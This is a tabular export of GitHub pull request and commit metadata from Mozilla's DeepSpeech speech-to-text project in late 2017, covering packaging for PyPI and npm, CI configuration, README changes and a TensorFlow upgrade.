This refers to file names, the models + audio, in the release notes. So, it should only go live close to when the release notes go live.",kdavis-mozilla,12054740,2017-11-22T13:44:12Z,CONTRIBUTOR,True,0,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4a3b7c38574db34c83df462787c3810f212e00bf,Fixed #990 and Fixed #989
3419,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1004,1004,Fixed #990 and Fixed #989,"Fixed #990 and Fixed #989 

This refers to file names, the models + audio, in the release notes. So, it should only go live close to when the release notes go live.",kdavis-mozilla,12054740,2017-11-22T13:44:12Z,CONTRIBUTOR,True,0,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d988ba15214e7cf5911cf0b247f6021f7c0d2e2f,Mage image smaller
3420,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1003,1003,Fixed #993,"Fixes #993 however, merge should wait until we've gotten PyPI to increase the limit of deepspeech-gpu",kdavis-mozilla,12054740,2017-11-22T12:43:50Z,CONTRIBUTOR,True,22,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,61467d3a568dd38591b21138a040770066006731,Fixed #993
3421,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1003,1003,Fixed #993,"Fixes #993 however, merge should wait until we've gotten PyPI to increase the limit of deepspeech-gpu",kdavis-mozilla,12054740,2017-11-22T12:43:50Z,CONTRIBUTOR,True,22,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,523efe4b39204b019c41aca800556c7676639dd8,Addressed comments
3422,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1003,1003,Fixed #993,"Fixes #993 however, merge should wait until we've gotten PyPI to increase the limit of deepspeech-gpu",kdavis-mozilla,12054740,2017-11-22T12:43:50Z,CONTRIBUTOR,True,22,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bcf1b839d1899c8364f04d384a245fda9525c799,Added dollar sign
3423,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1002,1002,Change node project name when building with CUDA,,reuben,477142,2017-11-22T10:55:44Z,MEMBER,True,13,10,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,04babe4ee5f2ee83c906a5cd5051616b2d6898df,Change node project name when building with CUDA
3424,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1000,1000,WIP Don't do npm ls on prepublish hook,,reuben,477142,2017-11-21T21:53:59Z,MEMBER,True,1,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ad9fee4ef47cd459b02ec108d3fb84a4a854f50d,Don't do npm ls on prepublish hook
3425,https://api.github.com/repos/mozilla/DeepSpeech/pulls/998,998,Add virtualenv documentation for Python,Fixes #983,lissyx,1645737,2017-11-21T10:20:38Z,COLLABORATOR,True,42,3,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4e6cad87a65f25f29a606904922b5c4dafcaee4c,"Add virtualenv documentation for Python

Fixes #983"
3426,https://api.github.com/repos/mozilla/DeepSpeech/pulls/997,997,Fixed #996,,kdavis-mozilla,12054740,2017-11-21T10:02:34Z,CONTRIBUTOR,True,9,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a55b2657e4b11990a766cf7276801b581ede0dad,Fixed #996
3427,https://api.github.com/repos/mozilla/DeepSpeech/pulls/980,980,Update metadata for Python and Node.JS packages,,reuben,477142,2017-11-20T23:13:52Z,MEMBER,True,21,10,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d12201cef47a248faa15e0d6f09d03d56e8cea71,Update metadata for Python and Node.JS packages
3428,https://api.github.com/repos/mozilla/DeepSpeech/pulls/975,975,All NodeJS into one package,,lissyx,1645737,2017-11-20T09:59:06Z,COLLABORATOR,True,82,18,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9045824a03932d80286af9400808478d6f6303a4,All NodeJS into one package
3429,https://api.github.com/repos/mozilla/DeepSpeech/pulls/975,975,All NodeJS into one package,,lissyx,1645737,2017-11-20T09:59:06Z,COLLABORATOR,True,82,18,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b613892576744d1ebdcc91664ed2295fd9ef701f,Add Node.JS package upload via scriptWorker
3430,https://api.github.com/repos/mozilla/DeepSpeech/pulls/974,974,Test PR,Creating a test PR,warent,13342266,2017-11-20T02:08:25Z,NONE,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f53cfd2d89b90fa498b1d2a8365d6cfaa1b4bc6c,Update README.md
3431,https://api.github.com/repos/mozilla/DeepSpeech/pulls/972,972,Update README to include GIF and feature usage of the Python package more prominently,,reuben,477142,2017-11-17T19:18:54Z,MEMBER,True,30,23,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5ce7a2d48f5b6c1dfa979c9656b5e2433c0b2860,Update README to include GIF and feature usage of the Python package more prominently
3432,https://api.github.com/repos/mozilla/DeepSpeech/pulls/971,971,Tensorflow r1.4,,lissyx,1645737,2017-11-17T18:50:25Z,COLLABORATOR,True,71,20,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5b0ca1e4104ec47c7ac0544b646a4d4b2ce728f9,"Update to TensorFlow r1.4

Fixes #959"
3433,https://api.github.com/repos/mozilla/DeepSpeech/pulls/971,971,Tensorflow r1.4,,lissyx,1645737,2017-11-17T18:50:25Z,COLLABORATOR,True,71,20,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1c5aa0a881f223c6a132ea07df599a0da25786bb,Run training test against forked and upstream TensorFlow
3434,https://api.github.com/repos/mozilla/DeepSpeech/pulls/969,969,Update prod tests to match new output,,reuben,477142,2017-11-17T14:59:31Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3c2e3d1e9a6e0de701bf24a3b8847abd35db29a3,Update prod tests to match new output
3435,https://api.github.com/repos/mozilla/DeepSpeech/pulls/968,968,Hotfix undeeded dependencies for scriptWorker,,lissyx,1645737,2017-11-17T14:36:42Z,COLLABORATOR,True,0,8,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,538616c0d2b55dee65dd5e7d655458bf5721f1d7,Hotfix undeeded dependencies for scriptWorker
3436,https://api.github.com/repos/mozilla/DeepSpeech/pulls/967,967,Update hyperparameters,,reuben,477142,2017-11-17T13:04:49Z,MEMBER,True,12,12,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,99d0c311a3e6108ed835fa38e4680ba7b3744fad,Update hyperparameters
3437,https://api.github.com/repos/mozilla/DeepSpeech/pulls/966,966,"Revert ""Added language model with apostrophe""",This reverts commit c5db7d1f71556e63805c3ab57a4b6baa3b8ca294 and fixed #965  ,kdavis-mozilla,12054740,2017-11-17T12:43:16Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8886afc81e9b3cdd1866cfb8a5fa981d9e158969,"Revert ""Added language model with apostrophe""

This reverts commit c5db7d1f71556e63805c3ab57a4b6baa3b8ca294."
3438,https://api.github.com/repos/mozilla/DeepSpeech/pulls/963,963,Schedule a scriptWorker task on push of tag,,lissyx,1645737,2017-11-16T10:14:27Z,COLLABORATOR,True,73,1,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4d6d6594fb9a584eeb4c9330fe3bfaa25390091f,Schedule a scriptWorker task on push of tag
3439,https://api.github.com/repos/mozilla/DeepSpeech/pulls/962,962,Package README and rename wheels to be uploadable to PyPI,,reuben,477142,2017-11-15T13:37:19Z,MEMBER,True,129,95,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f1d89c02be6ce38c1d1885fa5132d3209aea069d,Lie about manylinux1 so we can get our packages on PyPI
3440,https://api.github.com/repos/mozilla/DeepSpeech/pulls/962,962,Package README and rename wheels to be uploadable to PyPI,,reuben,477142,2017-11-15T13:37:19Z,MEMBER,True,129,95,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,92e53a7a06e53f35def0fc74ba3ff62329afdd5b,Add -gpu prefix to CUDA enabled packages
3441,https://api.github.com/repos/mozilla/DeepSpeech/pulls/962,962,Package README and rename wheels to be uploadable to PyPI,,reuben,477142,2017-11-15T13:37:19Z,MEMBER,True,129,95,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,52d9a8b26531201e6c699f0b682429c23fccff20,Bump version to 0.0.2 to workaround PyPI limitations
3442,https://api.github.com/repos/mozilla/DeepSpeech/pulls/962,962,Package README and rename wheels to be uploadable to PyPI,,reuben,477142,2017-11-15T13:37:19Z,MEMBER,True,129,95,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6ad9cc78a943ab5343caa1546c6bd1b33679f6cb,Ignore all .egg-infos
3443,https://api.github.com/repos/mozilla/DeepSpeech/pulls/962,962,Package README and rename wheels to be uploadable to PyPI,,reuben,477142,2017-11-15T13:37:19Z,MEMBER,True,129,95,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,937c3046823735624842461041d10f65e23f1529,Bundle the Python client as an entry point script
3444,https://api.github.com/repos/mozilla/DeepSpeech/pulls/961,961,Data set builder,,tilmankamp,5991088,2017-11-15T09:27:35Z,CONTRIBUTOR,False,541,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,52b9a4b9dbb7d53f82cd984e740d8372ea36651e,data set tool skeleton
3445,https://api.github.com/repos/mozilla/DeepSpeech/pulls/961,961,Data set builder,,tilmankamp,5991088,2017-11-15T09:27:35Z,CONTRIBUTOR,False,541,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0052b9c6465d105f5b951b5c9e6fc69e2f832d09,Deriving from parser class
3446,https://api.github.com/repos/mozilla/DeepSpeech/pulls/961,961,Data set builder,,tilmankamp,5991088,2017-11-15T09:27:35Z,CONTRIBUTOR,False,541,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,174cadf51eab9ae870fbad5f05bfcc7c5f59af9f,simple commands plus sox support
3447,https://api.github.com/repos/mozilla/DeepSpeech/pulls/961,961,Data set builder,,tilmankamp,5991088,2017-11-15T09:27:35Z,CONTRIBUTOR,False,541,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d51767e2a6fe0c31e590ab52cada3e87c1b29cc8,saving and playing
3448,https://api.github.com/repos/mozilla/DeepSpeech/pulls/961,961,Data set builder,,tilmankamp,5991088,2017-11-15T09:27:35Z,CONTRIBUTOR,False,541,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,775ccc6b708034af8b557fb55bc348367bbbfda3,basic augmentation support
3449,https://api.github.com/repos/mozilla/DeepSpeech/pulls/961,961,Data set builder,,tilmankamp,5991088,2017-11-15T09:27:35Z,CONTRIBUTOR,False,541,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bbfc5456ed23f8a4d9bf0a118200f7de09c88f32,Fix: Now writing augmented samples to tmp
3450,https://api.github.com/repos/mozilla/DeepSpeech/pulls/961,961,Data set builder,,tilmankamp,5991088,2017-11-15T09:27:35Z,CONTRIBUTOR,False,541,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3057edb65f975016b283d7da386622f4e5813098,Augmentation with relative loudness
3451,https://api.github.com/repos/mozilla/DeepSpeech/pulls/961,961,Data set builder,,tilmankamp,5991088,2017-11-15T09:27:35Z,CONTRIBUTOR,False,541,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,724d3957f9ab007a926010354785eea984cf867d,Better wav file sharing
3452,https://api.github.com/repos/mozilla/DeepSpeech/pulls/961,961,Data set builder,,tilmankamp,5991088,2017-11-15T09:27:35Z,CONTRIBUTOR,False,541,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,44932ccb7bb76d4c19052450afc4a87671750b3b,Added named buffer support
3453,https://api.github.com/repos/mozilla/DeepSpeech/pulls/961,961,Data set builder,,tilmankamp,5991088,2017-11-15T09:27:35Z,CONTRIBUTOR,False,541,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,270b9662fbcee4ccbd5c803aaccc04e1a61b92fb,Grouped help message
3454,https://api.github.com/repos/mozilla/DeepSpeech/pulls/961,961,Data set builder,,tilmankamp,5991088,2017-11-15T09:27:35Z,CONTRIBUTOR,False,541,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,518c1803a290550e587ba1c63dfadd2afe792a39,Thread pooling
3455,https://api.github.com/repos/mozilla/DeepSpeech/pulls/961,961,Data set builder,,tilmankamp,5991088,2017-11-15T09:27:35Z,CONTRIBUTOR,False,541,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,de8c7d9afca7eb92eebc2ced722b9b430a0303a0,Added direct effect commands
3456,https://api.github.com/repos/mozilla/DeepSpeech/pulls/961,961,Data set builder,,tilmankamp,5991088,2017-11-15T09:27:35Z,CONTRIBUTOR,False,541,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b88f82e5a2b902dd492a36d84cdcc9776e932966,More effects
3457,https://api.github.com/repos/mozilla/DeepSpeech/pulls/961,961,Data set builder,,tilmankamp,5991088,2017-11-15T09:27:35Z,CONTRIBUTOR,False,541,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a537c95a6d507666ec8ab0daf2ed852eb21eac3a,Removed unused imports
3458,https://api.github.com/repos/mozilla/DeepSpeech/pulls/960,960,[WIP] Make sure we have what's necessary for publishing to PyPI/NPM,,reuben,477142,2017-11-15T09:26:17Z,MEMBER,False,7,6,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9bec4d98ee43c59fca08578502433fcaaf3e85bb,Package source distribution of the Python package
3459,https://api.github.com/repos/mozilla/DeepSpeech/pulls/958,958,Run test coverage against prod-similar model,Fixes #918,lissyx,1645737,2017-11-14T12:16:54Z,COLLABORATOR,True,203,4,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,319bfe97301bf3daf377030ee0e7858298378df4,"Run test coverage against prod-similar model

Fixes #918"
3460,https://api.github.com/repos/mozilla/DeepSpeech/pulls/957,957,Produce Python/NodeJS packages for GPU-enabled builds,,lissyx,1645737,2017-11-14T08:21:24Z,COLLABORATOR,True,9,10,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,80b3f44f10424c43320f92483c4090bb083ae6a1,Produce Python/NodeJS packages for GPU-enabled builds
3461,https://api.github.com/repos/mozilla/DeepSpeech/pulls/956,956,Added language model with apostrophe,,kdavis-mozilla,12054740,2017-11-13T15:11:31Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c5db7d1f71556e63805c3ab57a4b6baa3b8ca294,Added language model with apostrophe
3462,https://api.github.com/repos/mozilla/DeepSpeech/pulls/954,954,Fix node.js bindings installation on macOS,Creating PR so I can test the TC package.,reuben,477142,2017-11-13T10:27:16Z,MEMBER,False,19,18,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,80856ba23445a814edfd763b64c9a10ef4fe7fd2,Point to master CPU task in package.json
3463,https://api.github.com/repos/mozilla/DeepSpeech/pulls/949,949,Update and re-organize README,"I added more information about the clients and changed the order of the instructions a little bit, to hopefully make it easier to follow.",reuben,477142,2017-11-07T20:59:58Z,MEMBER,True,162,54,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e96a6dffa1903409a605eb3277d26227fa0273d6,Update and re-organize README
3464,https://api.github.com/repos/mozilla/DeepSpeech/pulls/949,949,Update and re-organize README,"I added more information about the clients and changed the order of the instructions a little bit, to hopefully make it easier to follow.",reuben,477142,2017-11-07T20:59:58Z,MEMBER,True,162,54,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9f1b20efc3df3279f8527a63a609c56996fcd703,Rename util/tc.py to util/taskcluster.py
3465,https://api.github.com/repos/mozilla/DeepSpeech/pulls/949,949,Update and re-organize README,"I added more information about the clients and changed the order of the instructions a little bit, to hopefully make it easier to follow.",reuben,477142,2017-11-07T20:59:58Z,MEMBER,True,162,54,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,815d4f4f4c20085b40cb0cf3cdbaa4b8737e027f,Address review comments
3466,https://api.github.com/repos/mozilla/DeepSpeech/pulls/949,949,Update and re-organize README,"I added more information about the clients and changed the order of the instructions a little bit, to hopefully make it easier to follow.",reuben,477142,2017-11-07T20:59:58Z,MEMBER,True,162,54,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,54c7931e9c9352ab188e374ac70dc0f6c3adcd63,Improve client.py documentation
3467,https://api.github.com/repos/mozilla/DeepSpeech/pulls/949,949,Update and re-organize README,"I added more information about the clients and changed the order of the instructions a little bit, to hopefully make it easier to follow.",reuben,477142,2017-11-07T20:59:58Z,MEMBER,True,162,54,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d2f6efce1b94d5269852a45667ce614b66baeb55,Improve client.js documentation
3468,https://api.github.com/repos/mozilla/DeepSpeech/pulls/943,943,Properly limit scheduling of some tasks to PR or merge,Fixes #940,lissyx,1645737,2017-11-03T20:32:30Z,COLLABORATOR,True,86,66,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2916d3bc8cdaa435cfcc6afecf4d00d519b2fc24,"Properly limit scheduling of some tasks to PR or merge

Fixes #940"
3469,https://api.github.com/repos/mozilla/DeepSpeech/pulls/942,942,"Revert ""Set routes to empty for AOT Test build""",Reverts mozilla/DeepSpeech#941,lissyx,1645737,2017-11-03T18:37:07Z,COLLABORATOR,True,0,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b21cf0a05185feb1e640cd871eef191ea25f0c87,"Revert ""Set routes to empty for AOT Test build"""
3470,https://api.github.com/repos/mozilla/DeepSpeech/pulls/941,941,Set routes to empty for AOT Test build,Fixes #940,lissyx,1645737,2017-11-03T18:28:34Z,COLLABORATOR,True,2,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a7abc4d6a86ef89771a44a1c3e4851a0bcd5a85e,"Set routes to empty for AOT Test build

Fixes #940"
3471,https://api.github.com/repos/mozilla/DeepSpeech/pulls/939,939,TaskCluster IRC notifications,Fixes #927,lissyx,1645737,2017-11-03T11:58:09Z,COLLABORATOR,True,18,0,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b42ade38bcda00c41c065f216c6702032393a213,"TaskCluster IRC notifications

Fixes #927"
3472,https://api.github.com/repos/mozilla/DeepSpeech/pulls/938,938,Ds2 v2,,Drea1989,25469793,2017-11-03T06:28:17Z,NONE,False,259,146,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,72a6331e808efbdf93715f4ac5ea9226ad202818,Add Deep Speech 2 implementation
3473,https://api.github.com/repos/mozilla/DeepSpeech/pulls/938,938,Ds2 v2,,Drea1989,25469793,2017-11-03T06:28:17Z,NONE,False,259,146,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f263dd1134d8e76cf9d24cb83f90129bff8bfde4,minor name error fixes
3474,https://api.github.com/repos/mozilla/DeepSpeech/pulls/938,938,Ds2 v2,,Drea1989,25469793,2017-11-03T06:28:17Z,NONE,False,259,146,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9b61505424e2c900cfd8a40c448909e030b05aca,Feed is_training placeholder when retrieving global_step from checkpoint
3475,https://api.github.com/repos/mozilla/DeepSpeech/pulls/938,938,Ds2 v2,,Drea1989,25469793,2017-11-03T06:28:17Z,NONE,False,259,146,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,02f33810b74c4f308c4344967eeca0fa9c0fa4f9,Add a bin/run-ds2.sh script
3476,https://api.github.com/repos/mozilla/DeepSpeech/pulls/938,938,Ds2 v2,,Drea1989,25469793,2017-11-03T06:28:17Z,NONE,False,259,146,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6b6e51fe37174d33a192c34491d9b468c6b7a304,Respect decay command line flag
3477,https://api.github.com/repos/mozilla/DeepSpeech/pulls/938,938,Ds2 v2,,Drea1989,25469793,2017-11-03T06:28:17Z,NONE,False,259,146,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,02b64c1a2a9a04ef09cb5033601cbc91e536e867,Fix export code for DS2
3478,https://api.github.com/repos/mozilla/DeepSpeech/pulls/936,936,Use sox include/link flags only on deepspeech binary,Fixes #935,lissyx,1645737,2017-11-02T15:24:56Z,COLLABORATOR,True,9,4,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ddb94585cc10a351b7103577cec824f0a64d9548,"Use sox include/link flags only on deepspeech binary

Fixes #935"
3479,https://api.github.com/repos/mozilla/DeepSpeech/pulls/934,934,Remove 'runs/0' references in artifacts path,"Generated with:
$ sed -ri 's|runs/0/||g' taskcluster/*.tyml

Fixes #933",lissyx,1645737,2017-11-02T14:28:59Z,COLLABORATOR,True,5,5,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7e9767f0d8f39772e47688a97adcf36b5aea6bff,"Remove 'runs/0' references in artifacts path

Generated with:
$ sed -ri 's|runs/0/||g' taskcluster/*.tyml

Fixes #933"
3480,https://api.github.com/repos/mozilla/DeepSpeech/pulls/932,932,Catch more error conditions and improve error messages,,reuben,477142,2017-11-01T21:58:11Z,MEMBER,True,85,20,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eb10f7238dd89b8166eabcd36b7d2c1a3fef5fdc,Improve error message on incompatible checkpoint shape
3481,https://api.github.com/repos/mozilla/DeepSpeech/pulls/932,932,Catch more error conditions and improve error messages,,reuben,477142,2017-11-01T21:58:11Z,MEMBER,True,85,20,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,17966809b7be4dde3eb4938e6ef4309440f0cc84,Print error messages in Model construction instead of silently continuing
3482,https://api.github.com/repos/mozilla/DeepSpeech/pulls/932,932,Catch more error conditions and improve error messages,,reuben,477142,2017-11-01T21:58:11Z,MEMBER,True,85,20,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ad45ab47e60a3916bf199b1ccc6910bde78d5047,Detect and warn about alphabets that don't match the model shape
3483,https://api.github.com/repos/mozilla/DeepSpeech/pulls/932,932,Catch more error conditions and improve error messages,,reuben,477142,2017-11-01T21:58:11Z,MEMBER,True,85,20,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8ed77a0b93af67e813707d5dab6e5f290e3f3120,Detect and warn about audio files too short for their transcripts
3484,https://api.github.com/repos/mozilla/DeepSpeech/pulls/932,932,Catch more error conditions and improve error messages,,reuben,477142,2017-11-01T21:58:11Z,MEMBER,True,85,20,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4a10d400da51df8abd77c09b79c16982b58988a1,Save alphabet size in trie file and check it when loading
3485,https://api.github.com/repos/mozilla/DeepSpeech/pulls/929,929,Remove audio file too large for its transcript (Fixes #928),,reuben,477142,2017-11-01T20:15:21Z,MEMBER,True,4,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,70cf82645364886bad6585f7171972c6422674a4,Remove audio file too large for its transcript
3486,https://api.github.com/repos/mozilla/DeepSpeech/pulls/926,926,Proper definition of .build.yml,"Array to sr() was undocumented and is not supported in JS.

Fixes #925",lissyx,1645737,2017-10-31T20:58:28Z,COLLABORATOR,True,25,26,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d4f3392aec1c309f3f5f691e4ef4f72bcfaf41b4,"Proper definition of .build.yml

Array to sr() was undocumented and is not supported in JS.

Fixes #925"
3487,https://api.github.com/repos/mozilla/DeepSpeech/pulls/924,924,Bundle libs into python/node packages,,lissyx,1645737,2017-10-31T18:29:46Z,COLLABORATOR,True,71,13,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,08f01c1727f6dedbccbc6d219e4e32665e29770b,"Bundle libs into Python/NodeJS bindings packages

Fixes #908"
3488,https://api.github.com/repos/mozilla/DeepSpeech/pulls/923,923,Add missing routes entry for libctc,Fixes #922,lissyx,1645737,2017-10-31T16:33:04Z,COLLABORATOR,True,2,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7321410bd9ef7748c9cb69ddb3b5e0d4f2cbfae3,"Add missing routes entry for libctc

Fixes #922"
